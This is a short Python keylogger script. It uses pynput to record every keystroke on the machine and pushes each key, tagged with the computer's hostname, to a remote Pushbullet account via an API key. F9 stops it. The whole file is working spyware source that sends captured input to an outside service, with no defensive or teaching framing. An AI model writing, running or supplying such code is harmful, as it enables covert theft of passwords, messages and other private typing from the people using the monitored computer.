from pushbullet import Pushbullet
from pynput.keyboard import Listener
import logging
import keyboard
import socket

pc = socket.gethostname()
API_KEY = "add your api key here"


# Setup logging
logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):  # The function that's called when a key is pressed
	pb = Pushbullet(API_KEY)
	push = pb.push_note(pc, "Key pressed: {0}".format(key))

	 

def on_release(key):  # The function that's called when a key is released
	if keyboard.read_key() == 'f9':
		listener.stop()
	

with Listener(on_press=on_press, on_release=on_release) as listener:  # Create an instance of Listener
    listener.join()  # Join the listener thread to the main thread to keep waiting for keys